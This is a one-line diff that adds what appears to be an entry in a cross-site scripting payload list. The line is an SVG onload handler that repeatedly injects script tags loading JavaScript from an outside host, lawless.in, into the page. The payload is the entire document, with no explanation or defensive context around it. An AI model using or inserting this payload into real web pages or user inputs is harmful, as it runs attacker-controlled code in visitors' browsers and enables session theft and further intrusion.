@@ -1,0 +1,1 @@
+svg/onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//lawless.in";d.body.appendChild(z)},0)
